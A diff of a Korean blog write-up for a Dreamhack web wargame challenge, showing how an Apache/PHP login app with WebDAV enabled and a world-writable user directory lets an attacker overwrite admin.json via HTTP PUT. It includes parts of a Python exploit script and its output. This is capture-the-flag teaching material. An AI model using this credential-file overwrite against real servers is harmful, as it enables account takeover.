@@ -33,13 +33,15 @@ tags: [TIL, WEB, CTF]
 
 Dreamhack 링크: <https://dreamhack.io/wargame/challenges/2105>
 
-Apache와 PHP로 구성된 간단한 로그인 애플리케이션.
+Apache와 PHP로 구성된 간단한 로그인 애플리케이션이다.
 
-사용자 정보는 데이터베이스가 아닌 JSON 파일에 저장되어 있으며, 관리자 계정으로 로그인하면 `/flag.php`에서 플래그를 확인할 수 있다.
+사용자 정보가 JSON 파일에 저장되어 있고, 관리자 계정으로 로그인하면 `/flag.php`에서 플래그를 확인할 수 있다.
 
 ## 2. Code
 
-파일 구조
+<details>
+<summary>파일 구조 접기/펼치기</summary>
+<div markdown="1">
 
 ```text
 /
@@ -60,6 +62,9 @@ Apache와 PHP로 구성된 간단한 로그인 애플리케이션.
         ├── guest.json
         └── index.php
 ```
+
+</div>
+</details>
 
 ### 2.1. Dockerfile
 
@@ -100,7 +105,8 @@ CMD ["/usr/sbin/run.sh"]
 </div>
 </details>
 
-인증 정보가 웹 루트 내부에 저장됨
+- 인증 정보가 웹 루트 내부에 저장되어 있다.
+- `/var/www/html/user` -> 권한이 777이다.
 
 ### 2.2. 000-default.conf
 
@@ -135,7 +141,7 @@ CMD ["/usr/sbin/run.sh"]
 </div>
 </details>
 
-WebDAV는 HTTP를 통해 파일 생성과 수정을 허용한다.
+- WebDAV(Web Distributed Authoring and Versioning): HTTP를 통해 파일 생성과 수정이 가능하다.
 
 ### 2.3. .htaccess
 
@@ -153,7 +159,7 @@ WebDAV는 HTTP를 통해 파일 생성과 수정을 허용한다.
 </div>
 </details>
 
-`PUT`을 이용한 파일 덮어쓰기 가능
+- `DELETE`만 차단 -> `PUT`을 이용해 파일 덮어쓰기가 가능하다.
 
 ### 2.1. login.php
 
@@ -229,7 +235,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </div>
 </details>
 
-관리자 계정의 비밀번호 해시를 알고 있거나 변경할 수 있다면 정상적인 로그인 절차를 통해 관리자 세션을 얻을 수 있다.
+- 관리자 계정의 비밀번호 해시를 알고 있거나 변경할 수 있다면, 정상적인 로그인 절차를 통해 관리자 세션을 얻을 수 있다.
 
 ### 2.2. flag.php
 
@@ -274,6 +280,8 @@ if ($_SESSION['user'] !== "admin") {
 
 ### 4.1. admin.json 덮어쓰기
 
+파이썬 `requests` 모듈을 통해 admin.json에 `PUT` 요청을 보내 원하는 비밀번호로 수정했다.
+
 <details>
 <summary>전체 코드 접기/펼치기</summary>
 <div markdown="1">
@@ -284,7 +292,7 @@ import json
 
 import requests
 
-base_url = "http://host3.dreamhack.games:19889"
+base_url = "<DREAMHACK_URL>"
 new_password = "admin1234"
 
 password_hash = hashlib.sha256(
@@ -318,15 +326,17 @@ print(response.status_code)
 print(response.text)
 ```
 
+</div>
+</details>
+
+실행 결과:
+
 ```text
 204 No Content
 
 200
 {"no": 0, "id": "admin", "password": "ac9689e2272427085e35b9d3e3e8bed88cb3434828b43b86fc0596cad4c6e270"}
 ```
-
-</div>
-</details>
 
 ### 4.2. flag.php 접근
 
